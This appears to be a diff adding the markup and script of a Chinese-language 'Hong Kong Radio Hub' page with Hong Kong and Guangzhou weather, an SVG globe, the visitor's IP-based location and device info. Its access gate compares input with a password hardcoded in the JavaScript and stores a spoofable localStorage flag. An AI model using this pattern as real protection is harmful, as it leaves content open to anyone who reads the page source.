+        </g>
+
+        <path
+          d="
+            M15 42
+            C15 35 23 32 29 36
+            C34 28 48 31 49 40
+            C55 40 57 49 48 51
+            H19
+            C12 51 9 44 15 42Z
+          "
+          fill="#7c9cff"
+        />
+
+      </svg>
+
+    </div>
+
+    <div class="weather-main">
+
+      <div
+        class="temp"
+        id="hkTemp">
+
+        --°
+
+      </div>
+
+      <div
+        class="weather-desc"
+        id="hkWeather">
+
+        获取天气中
+
+      </div>
+
+    </div>
+
+    <div class="weather-info">
+
+      <span>
+        湿度
+        <b id="hkHumidity">--</b>%
+      </span>
+
+      <span>
+        风速
+        <b id="hkWind">--</b>
+        km/h
+      </span>
+
+    </div>
+
+  </div>
+
+
+  <!-- 广州 -->
+
+  <div class="weather">
+
+    <div class="weather-top">
+
+      <span class="city">
+        广州 · Guangzhou
+      </span>
+
+      <svg
+        class="weather-icon"
+        viewBox="0 0 64 64">
+
+        <circle
+          cx="31"
+          cy="27"
+          r="13"
+          fill="#ffd76a"
+        />
+
+        <path
+          d="
+            M16 44
+            C16 36 25 33 31 37
+            C36 29 50 33 50 42
+            C56 42 57 51 49 52
+            H19
+            C12 52 10 46 16 44Z
+          "
+          fill="#8da6ff"
+        />
+
+      </svg>
+
+    </div>
+
+    <div class="weather-main">
+
+      <div
+        class="temp"
+        id="gzTemp">
+
+        --°
+
+      </div>
+
+      <div
+        class="weather-desc"
+        id="gzWeather">
+
+        获取天气中
+
+      </div>
+
+    </div>
+
+    <div class="weather-info">
+
+      <span>
+        湿度
+        <b id="gzHumidity">--</b>%
+      </span>
+
+      <span>
+        风速
+        <b id="gzWind">--</b>
+        km/h
+      </span>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<!-- =====================================================
+     3D GLOBE
+===================================================== -->
+
+<div class="globe-wrap">
+
+<div class="globe">
+
+<svg viewBox="0 0 500 500">
+
+<defs>
+
+  <radialGradient
+    id="earthGradient"
+    cx="35%"
+    cy="30%">
+
+    <stop
+      offset="0"
+      stop-color="#214d72"/>
+
+    <stop
+      offset=".55"
+      stop-color="#102c4b"/>
+
+    <stop
+      offset="1"
+      stop-color="#050b15"/>
+
+  </radialGradient>
+
+
+  <clipPath id="earthClip">
+
+    <circle
+      cx="250"
+      cy="250"
+      r="170"/>
+
+  </clipPath>
+
+</defs>
+
+
+<!-- 大气层 -->
+
+<circle
+  cx="250"
+  cy="250"
+  r="181"
+  fill="none"
+  stroke="rgba(78,205,255,.11)"
+  stroke-width="8"
+/>
+
+
+<!-- 外轨道 -->
+
+<circle
+  cx="250"
+  cy="250"
+  r="190"
+  class="orbit"
+/>
+
+
+<!-- 地球 -->
+
+<circle
+  cx="250"
+  cy="250"
+  r="170"
+  class="globe-core"
+/>
+
+
+<g clip-path="url(#earthClip)">
+
+
+  <!-- 纬线 -->
+
+  <ellipse
+    cx="250"
+    cy="250"
+    rx="170"
+    ry="55"
+    class="grid"
+  />
+
+  <ellipse
+    cx="250"
+    cy="250"
+    rx="170"
+    ry="110"
+    class="grid"
+  />
+
+  <ellipse
+    cx="250"
+    cy="250"
+    rx="170"
+    ry="145"
+    class="grid"
+  />
+
+
+  <!-- 经线 -->
+
+  <ellipse
+    cx="250"
+    cy="250"
+    rx="60"
+    ry="170"
+    class="grid"
+  />
+
+  <ellipse
+    cx="250"
+    cy="250"
+    rx="115"
+    ry="170"
+    class="grid"
+  />
+
+  <ellipse
+    cx="250"
+    cy="250"
+    rx="155"
+    ry="170"
+    class="grid"
+  />
+
+
+  <!-- 世界大陆示意 -->
+
+  <path
+    class="continent"
+    d="
+      M90 150
+      C115 118 160 104 195 115
+      L218 137
+      207 166
+      180 174
+      165 201
+      130 190
+      104 174Z
+    "
+  />
+
+  <path
+    class="continent"
+    d="
+      M185 225
+      C205 215 232 222 242 250
+      L226 278
+      220 326
+      192 365
+      171 337
+      179 296
+      160 266Z
+    "
+  />
+
+  <path
+    class="continent"
+    d="
+      M258 142
+      C290 110 350 108 391 131
+      L418 158
+      400 179
+      365 171
+      347 191
+      315 178
+      284 190
+      260 168Z
+    "
+  />
+
+  <path
+    class="continent"
+    d="
+      M330 208
+      C367 190 415 211 429 247
+      L409 276
+      381 278
+      368 315
+      339 340
+      319 309
+      330 275
+      311 247Z
+    "
+  />
+
+  <path
+    class="continent"
+    d="
+      M260 330
+      C290 314 324 326 335 353
+      L320 383
+      282 390
+      257 367Z
+    "
+  />
+
+</g>
+
+
+<!-- =====================================================
+     香港
+===================================================== -->
+
+<line
+  x1="349"
+  y1="207"
+  x2="402"
+  y2="174"
+  stroke="#52d9ff"
+  stroke-width=".7"
+  opacity=".5"
+/>
+
+<circle
+  cx="349"
+  cy="207"
+  r="13"
+  class="pulse"
+/>
+
+<circle
+  cx="349"
+  cy="207"
+  r="4"
+  class="location"
+/>
+
+<text
+  x="407"
+  y="174"
+  class="globe-label">
+
+  HONG KONG
+
+</text>
+
+
+<!-- =====================================================
+     广州
+===================================================== -->
+
+<circle
+  cx="340"
+  cy="196"
+  r="4"
+  class="gz-location"
+/>
+
+<text
+  x="415"
+  y="221"
+  class="globe-label">
+
+  GUANGZHOU
+
+</text>
+
+
+<!-- =====================================================
+     访客位置
+===================================================== -->
+
+<g
+  id="visitorLocation"
+  opacity="0">
+
+  <line
+    id="visitorLine"
+    class="visitor-line"
+    x1="250"
+    y1="250"
+    x2="250"
+    y2="250"
+  />
+
+  <circle
+    id="visitorPulse"
+    class="visitor-pulse"
+    cx="250"
+    cy="250"
+    r="4"
+  />
+
+  <circle
+    id="visitorDot"
+    class="visitor-dot"
+    cx="250"
+    cy="250"
+    r="4"
+  />
+
+  <text
+    id="visitorLabel"
+    class="visitor-label"
+    x="260"
+    y="250">
+
+    YOU
+
+  </text>
+
+</g>
+
+</svg>
+
+
+<div class="globe-caption">
+
+  <strong>
+    GLOBAL · LIVE
+  </strong>
+
+  <span id="globeLocation">
+    正在定位访客
+  </span>
+
+</div>
+
+</div>
+
+</div>
+
+
+<!-- =====================================================
+     右侧信息
+===================================================== -->
+
+<div class="ip-panel">
+
+
+  <!-- VISITOR LOCATION -->
+
+  <div class="ip-card">
+
+    <div class="ip-head">
+
+      <span class="ip-title">
+        VISITOR LOCATION
+      </span>
+
+      <span class="online">
+
+        <i></i>
+
+        ONLINE
+
+      </span>
+
+    </div>
+
+    <div
+      class="ip-number"
+      id="heroIP">
+
+      获取中…
+
+    </div>
+
+    <div
+      class="ip-location"
+      id="heroLocation">
+
+      正在检测访问位置…
+
+    </div>
+
+    <div
+      class="ip-coordinates"
+      id="heroCoordinates">
+
+      LAT -- · LNG --
+
+    </div>
+
+  </div>
+
+
+  <!-- NETWORK REGION -->
+
+  <div class="ip-card">
+
+    <div class="ip-head">
+
+      <span class="ip-title">
+        NETWORK REGION
+      </span>
+
+      <span
+        style="
+          color:var(--cyan);
+          font-size:10px">
+
+        GEO IP
+
+      </span>
+
+    </div>
+
+    <div
+      class="region-content"
+      id="networkRegion">
+
+      <div>
+        <span>国家 / 地区</span>
+        <b>等待定位…</b>
+      </div>
+
+      <div>
+        <span>城市</span>
+        <b>等待定位…</b>
+      </div>
+
+      <div>
+        <span>区域</span>
+        <b>等待定位…</b>
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <!-- DEVICE -->
+
+  <div class="ip-card">
+
+    <div class="ip-head">
+
+      <span class="ip-title">
+        DEVICE
+      </span>
+
+      <span
+        style="
+          color:var(--cyan);
+          font-size:10px">
+
+        CLIENT INFO
+
+      </span>
+
+    </div>
+
+    <div class="device-list">
+
+      <div class="device-row">
+        <span>系统</span>
+        <span id="os">--</span>
+      </div>
+
+      <div class="device-row">
+        <span>浏览器</span>
+        <span id="browser">--</span>
+      </div>
+
+      <div class="device-row">
+        <span>屏幕</span>
+        <span id="screen">--</span>
+      </div>
+
+      <div class="device-row">
+        <span>语言</span>
+        <span id="lang">--</span>
+      </div>
+
+    </div>
+
+  </div>
+
+
+</div>
+
+</section>
+
+
+<!-- =======================================================
+     FOOTER
+======================================================= -->
+
+<footer>
+
+  Hong Kong Radio Hub ·
+  Metro ·
+  RTHK ·
+  Commercial Radio ·
+  此为学习测试使用，版权属于版权持有人。
+
+</footer>
+
+</div>
+
+
+<script>
+
+/* =========================================================
+   页面密码保护
+   localStorage + 7天有效期
+========================================================= */
+
+/* 在这里修改访问密码 */
+
+const PAGE_PASSWORD = "83875673";
+
+/* 密码验证有效期：7天 */
+
+const AUTH_EXPIRE =
+  7 * 24 * 60 * 60 * 1000;
+
+
+function checkPagePassword(){
+
+  const input =
+    document.getElementById(
+      "pagePassword"
+    );
+
+  const error =
+    document.getElementById(
+      "loginError"
+    );
+
+
+  if(
+    input.value ===
+    PAGE_PASSWORD
+  ){
+
+    /*
+     * 保存当前登录时间
+     * 7天内自动跳过密码页面
+     */
+
+    localStorage.setItem(
+      "radio_hub_auth",
+      Date.now().toString()
+    );
+
+
+    document.getElementById(
+      "loginScreen"
+    ).style.display =
+      "none";
+
+
+  }else{
+
+    error.style.display =
+      "block";
+
+    input.value =
+      "";
+
+    input.focus();
+
+  }
+
+}
+
+
+/* =========================================================
+   回车登录
+========================================================= */
+
+document
+  .getElementById(
+    "pagePassword"
+  )
+  .addEventListener(
+    "keydown",
+    function(e){
+
+      if(
+        e.key === "Enter"
+      ){
+
+        checkPagePassword();
+
+      }
+
+    }
+  );
+
+
+/* =========================================================
+   已经登录则直接进入
+   localStorage 7天有效
+========================================================= */
+
+const authTime =
+  localStorage.getItem(
+    "radio_hub_auth"
+  );
+
+
+if(
+  authTime &&
+  Date.now() -
+  Number(authTime) <
+  AUTH_EXPIRE
+){
+
+  document.getElementById(
+    "loginScreen"
+  ).style.display =
+    "none";
+
+}else{
+
+  /*
+   * 没有记录，或者已经超过7天
+   * 删除旧登录状态
+   */
+
+  localStorage.removeItem(
+    "radio_hub_auth"
+  );
+
+}
+
+
+/* =========================================================
+   星空
+========================================================= */
+
+(function(){
+
+  const svg =
+    document.getElementById(
+      "stars"
+    );
+
+  const ns =
+    "http://www.w3.org/2000/svg";
+
+
+  for(
+    let i=0;
+    i<120;
+    i++
+  ){
+
+    const c =
+      document.createElementNS(
+        ns,
+        "circle"
+      );
+
+
+    c.setAttribute(
+      "cx",
+      Math.random()*1600
+    );
+
+
+    c.setAttribute(
+      "cy",
+      Math.random()*1000
+    );
+
+
+    c.setAttribute(
+      "r",
+      Math.random()*1.2+.2
+    );
+
+
+    c.setAttribute(
+      "class",
+      "star"
+    );
+
+
+    c.style.animationDelay =
+      Math.random()*4+"s";
+
+
+    svg.appendChild(c);
+
+  }
+
+})();
+
+
+/* =========================================================
+   香港时间
+========================================================= */
+
+function updateClock(){
+
+  const d =
+    new Date();
+
+
+  const f =
+    new Intl.DateTimeFormat(
+      "zh-HK",
+      {
+        timeZone:"Asia/Hong_Kong",
+
+        hour:"2-digit",
+
+        minute:"2-digit",
+
+        second:"2-digit",
+
+        hour12:false
+      }
+    );
+
+
+  document.getElementById(
+    "clock"
+  ).textContent =
+    f.format(d);
+
+}
+
+
+updateClock();
+
+
+setInterval(
+  updateClock,
+  1000
+);
+
+
+/* =========================================================
+   WEATHER
+   一次请求同时获取香港 + 广州
+========================================================= */
+
+async function loadWeather(){
+
+  try{
+
+    const url =
+      "https://api.open-meteo.com/v1/forecast"+
+      "?latitude=22.3193,23.1291"+
+      "&longitude=114.1694,113.2644"+
+      "&current=temperature_2m,relative_humidity_2m,wind_speed_10m,weather_code";
+
+
+    const r =
+      await fetch(url);
+
+
+    if(!r.ok)
+      throw new Error();
+
+
+    const data =
+      await r.json();
+
+
+    const places =
+      Array.isArray(data)
+      ? data
+      : [data];
+
+
+    const hk =
+      places[0];
+
+
+    const gz =
+      places[1];
+
+
+    if(hk){
+
+      renderWeather(
+        "hk",
+        hk.current
+      );
+
+    }
+
+
+    if(gz){
+
+      renderWeather(
+        "gz",
+        gz.current
+      );
+
+    }
+
+  }catch(e){
+
+    document.getElementById(
+      "hkWeather"
+    ).textContent =
+      "天气暂不可用";
+
+
+    document.getElementById(
+      "gzWeather"
+    ).textContent =
+      "天气暂不可用";
+
+  }
+
+}
+
+
+function renderWeather(
+  key,
+  c
+){
+
+  if(!c)
+    return;
+
+
+  document.getElementById(
+    key+"Temp"
+  ).textContent =
+    Math.round(
+      c.temperature_2m
+    )+"°";
+
+
+  document.getElementById(
+    key+"Humidity"
+  ).textContent =
+    c.relative_humidity_2m;
+
+
+  document.getElementById(
+    key+"Wind"
+  ).textContent =
+    Math.round(
+      c.wind_speed_10m
+    );
+
+
+  document.getElementById(
+    key+"Weather"
+  ).textContent =
+    weatherText(
+      c.weather_code
+    );
+
+}
+
+
+function weatherText(
+  code
+){
+
+  if(code===0)
+    return "晴朗";
+
+
+  if(code<=3)
+    return "晴间多云";
+
+
+  if(code<=48)
+    return "雾";
+
+
+  if(code<=57)
+    return "毛毛雨";
+
+
+  if(code<=67)
+    return "降雨";
+
+
+  if(code<=77)
+    return "降雪";
+
+
+  if(code<=82)
+    return "阵雨";
+
+
+  if(code<=86)
+    return "阵雪";
+
+
+  if(code>=95)
+    return "雷暴";
+
+
+  return "多云";
+
+}
+
+
+loadWeather();
+
+
+/* =========================================================
+   IP GEOLOCATION
+   多 API 自动备用
+========================================================= */
+
+async function loadIP(){
+
+  /*
+   * 第一优先：
+   * ipapi.co
+   *
+   * 第二备用：
+   * ipwho.is
+   *
+   * 如果第一接口失败或者返回资料不完整，
+   * 自动尝试第二接口。
+   */
+
+
+  const apis = [
+
+    /* =====================================================
+       API 1：ipapi.co
+    ===================================================== */
+
+    async function(){
+
+      const r =
+        await fetch(
+          "https://ipapi.co/json/",
+          {
+            cache:"no-store"
+          }
+        );
+
+
+      if(!r.ok){
+
+        throw new Error(
+          "ipapi.co HTTP "+
+          r.status
+        );
+
+      }
+
+
+      const j =
+        await r.json();
+
+
+      if(
+        !j ||
+        !j.ip
+      ){
+
+        throw new Error(
+          "ipapi.co 返回数据无效"
+        );
+
+      }
+
+
+      const lat =
+        Number(
+          j.latitude
+        );
+
+
+      const lon =
+        Number(
+          j.longitude
+        );
+
+
+      /*
+       * 如果关键定位信息缺失，
+       * 不使用这个结果，继续备用 API。
+       */
+
+      if(
+        !j.country_name ||
+        !Number.isFinite(lat) ||
+        !Number.isFinite(lon)
+      ){
+
+        throw new Error(
+          "ipapi.co 定位资料不完整"
+        );
+
+      }
+
+
+      return {
+
+        ip:
+          j.ip || "",
+
+        city:
+          j.city || "",
+
+        region:
+          j.region || "",
+
+        country:
+          j.country_name || "",
+
+        countryCode:
+          j.country_code || "",
+
+        lat:
+          lat,
+
+        lon:
+          lon
+
+      };
+
+    },
+
+
+    /* =====================================================
+       API 2：ipwho.is
+    ===================================================== */
+
+    async function(){
+
+      const r =
+        await fetch(
+          "https://ipwho.is/",
+          {
+            cache:"no-store"
+          }
+        );
+
+
+      if(!r.ok){
+
+        throw new Error(
+          "ipwho.is HTTP "+
+          r.status
+        );
+
+      }
+
+
+      const j =
+        await r.json();
+
+
+      if(
+        !j ||
+        j.success === false ||
+        !j.ip
+      ){
+
+        throw new Error(
+          "ipwho.is 返回数据无效"
+        );
+
+      }
+
+
+      const lat =
+        Number(
+          j.latitude
+        );
+
+
+      const lon =
+        Number(
+          j.longitude
+        );
+
+
+      if(
+        !j.country ||
+        !Number.isFinite(lat) ||
+        !Number.isFinite(lon)
+      ){
+
+        throw new Error(
+          "ipwho.is 定位资料不完整"
+        );
+
+      }
+
+
+      return {
+
+        ip:
+          j.ip || "",
+
+        city:
+          j.city || "",
+
+        region:
+          j.region || "",
+
+        country:
+          j.country || "",
+
+        countryCode:
+          j.country_code || "",
+
+        lat:
+          lat,
+
+        lon:
+          lon
+
+      };
+
+    }
+
+  ];
+
+
+  let info =
+    null;
+
+
+  /* =====================================================
+     依次尝试 API
+  ===================================================== */
+
+  for(
+    const api of apis
+  ){
+
+    try{
+
+      const result =
+        await api();
+
+
+      if(
+        result &&
+        result.ip
+      ){
+
+        info =
+          result;
+
+        console.log(
+          "IP GEO 定位成功:",
+          result
+        );
+
+        break;
+
+      }
+
+    }catch(e){
+
+      console.warn(
+        "IP GEO API 失败，尝试备用接口:",
+        e
+      );
+
+    }
+
+  }
+
+
+  /* =====================================================
+     所有 API 都失败
+  ===================================================== */
+
+  if(!info){
+
+    document.getElementById(
+      "heroIP"
+    ).textContent =
+      "无法获取";
+
+
+    document.getElementById(
+      "heroLocation"
+    ).textContent =
+      "IP 服务暂时不可用";
+
+
+    document.getElementById(
+      "networkRegion"
+    ).innerHTML =
+
+      "<div>"+
+      "<span>国家 / 地区</span>"+
+      "<b>不可用</b>"+
+      "</div>"+
+
+      "<div>"+
+      "<span>城市</span>"+
+      "<b>不可用</b>"+
+      "</div>"+
+
+      "<div>"+
+      "<span>区域</span>"+
+      "<b>不可用</b>"+
+      "</div>";
+
+
+    document.getElementById(
+      "globeLocation"
+    ).textContent =
+      "无法定位访客";
+
+
+    return;
+
+  }
+
+
+  /* =====================================================
+     获取数据
+  ===================================================== */
+
+  const ip =
+    info.ip ||
+    "未知";
+
+
+  const city =
+    info.city ||
+    "";
+
+
+  const region =
+    info.region ||
+    "";
+
+
+  const country =
+    info.country ||
+    "";
+
+
+  const lat =
+    Number(
+      info.lat
+    );
+
+
+  const lon =
+    Number(
+      info.lon
+    );
+
+
+  const location =
+    [
+      city,
+      region,
+      country
+    ]
+    .filter(Boolean)
+    .join(" · ");
+
+
+  /* =====================================================
+     VISITOR LOCATION
+  ===================================================== */
+
+  document.getElementById(
+    "heroIP"
+  ).textContent =
+    ip;
+
+
+  document.getElementById(
+    "heroLocation"
+  ).textContent =
+    location ||
+    "未知位置";
+
+
+  if(
+    Number.isFinite(lat) &&
+    Number.isFinite(lon)
+  ){
+
+    document.getElementById(
+      "heroCoordinates"
+    ).textContent =
+      "LAT "+
+      lat.toFixed(4)+
+      " · LNG "+
+      lon.toFixed(4);
+
+  }
+
+
+  /* =====================================================
+     NETWORK REGION
+  ===================================================== */
+
+  document.getElementById(
+    "networkRegion"
+  ).innerHTML =
+
+    "<div>"+
+    "<span>国家 / 地区</span>"+
+    "<b>"+
+    escapeHtml(
+      country ||
+      "未知"
+    )+
+    "</b>"+
+    "</div>"+
+
+    "<div>"+
+    "<span>城市</span>"+
+    "<b>"+
+    escapeHtml(
+      city ||
+      "未知"
+    )+
+    "</b>"+
+    "</div>"+
+
+    "<div>"+
+    "<span>区域</span>"+
+    "<b>"+
+    escapeHtml(
+      region ||
+      "未知"
+    )+
+    "</b>"+
+    "</div>";
+
+
+  /* =====================================================
+     3D 地球
+  ===================================================== */
+
+  if(
+    Number.isFinite(lat) &&
+    Number.isFinite(lon)
+  ){
+
+    placeVisitor(
+      lat,
+      lon,
+      city,
+      country
+    );
+
+  }else{
+
+    document.getElementById(
+      "globeLocation"
+    ).textContent =
+      location ||
+      "访客位置";
+
+  }
+
+}
+
+
+/* =========================================================
+   经纬度 → SVG
+========================================================= */
+
+function projectGeo(
+  lat,
+  lon
+){
+
+  const cx=250;
+
+  const cy=250;
+
+  const r=170;
+
+
+  const lonRad =
+    lon*Math.PI/180;
+
+
+  const latRad =
+    lat*Math.PI/180;
+
+
+  const x =
+    cx +
+    r *
+    Math.cos(latRad) *
+    Math.sin(lonRad);
+
+
+  const y =
+    cy -
+    r *
+    Math.sin(latRad);
+
+
+  return {
+    x,
+    y
+  };
+
+}
+
+
+/* =========================================================
+   访客位置
+========================================================= */
+
+function placeVisitor(
+  lat,
+  lon,
+  city,
+  country
+){
+
+  const p =
+    projectGeo(
+      lat,
+      lon
+    );
+
+
+  const group =
+    document.getElementById(
+      "visitorLocation"
+    );
+
+
+  const dot =
+    document.getElementById(
+      "visitorDot"
+    );
+
+
+  const pulse =
+    document.getElementById(
+      "visitorPulse"
+    );
+
+
+  const line =
+    document.getElementById(
+      "visitorLine"
+    );
+
+
+  const label =
+    document.getElementById(
+      "visitorLabel"
+    );
+
+
+  const hkX=349;
+
+  const hkY=207;
+
+
+  dot.setAttribute(
+    "cx",
+    p.x
+  );
+
+
+  dot.setAttribute(
+    "cy",
+    p.y
+  );
+
+
+  pulse.setAttribute(
+    "cx",
+    p.x
+  );
+
+
+  pulse.setAttribute(
+    "cy",
+    p.y
+  );
+
+
+  line.setAttribute(
+    "x1",
+    hkX
+  );
+
+
+  line.setAttribute(
+    "y1",
+    hkY
+  );
+
+
+  line.setAttribute(
+    "x2",
+    p.x
+  );
+
+
+  line.setAttribute(
+    "y2",
+    p.y
+  );
+
+
+  label.setAttribute(
+    "x",
+    p.x+9
+  );
+
+
+  label.setAttribute(
+    "y",
+    p.y-8
+  );
+
+
+  const shortCity =
+    city ||
+    "YOU";
+
+
+  label.textContent =
+    shortCity
+      .toUpperCase()
+      .slice(0,18);
+
+
+  group.setAttribute(
+    "opacity",
+    "1"
+  );
+
+
+  document.getElementById(
+    "globeLocation"
+  ).textContent =
+    city
+      ? city+" · "+country
+      : "访客位置";
+
+}
+
+
+/* =========================================================
+   HTML 转义
+========================================================= */
+
+function escapeHtml(
+  value
+){
+
+  return String(value)
+    .replaceAll(
+      "&",
+      "&amp;"
+    )
+    .replaceAll(
+      "<",
+      "&lt;"
+    )
+    .replaceAll(
+      ">",
+      "&gt;"
+    )
+    .replaceAll(
+      '"',
+      "&quot;"
+    )
+    .replaceAll(
+      "'",
+      "&#039;"
+    );
+
+}
+
+
+loadIP();
+
+
+/* =========================================================
+   DEVICE
+========================================================= */
+
+function detectOS(){
+
+  const ua =
+    navigator.userAgent;
+
+
+  if(/Windows/i.test(ua))
+    return "Windows";
+
+
+  if(/Android/i.test(ua))
+    return "Android";
+
+
+  if(
+    /iPhone|iPad|iPod/i.test(ua)
+  )
+    return "iOS";
+
+
+  if(/Mac OS X/i.test(ua))
+    return "macOS";
+
+
+  if(/Linux/i.test(ua))
+    return "Linux";
+
+
+  return "Unknown";
+
+}
+
+
+function detectBrowser(){
+
+  const ua =
+    navigator.userAgent;
+
+
+  if(/Edg/i.test(ua))
+    return "Microsoft Edge";
+
+
+  if(/Chrome/i.test(ua))
+    return "Google Chrome";
+
+
+  if(/Firefox/i.test(ua))
+    return "Firefox";
+
+
+  if(/Safari/i.test(ua))
+    return "Safari";
+
+
+  return "Browser";
+
+}
+
+
+document.getElementById(
+  "os"
+).textContent =
+  detectOS();
+
+
+document.getElementById(
+  "browser"
+).textContent =
+  detectBrowser();
+
+
+document.getElementById(
+  "screen"
+).textContent =
+  screen.width+
+  " × "+
+  screen.height;
+
+
+document.getElementById(
+  "lang"
+).textContent =
+  navigator.language ||
+  "--";
+
+</script>
+
+</body>
+</html>
+
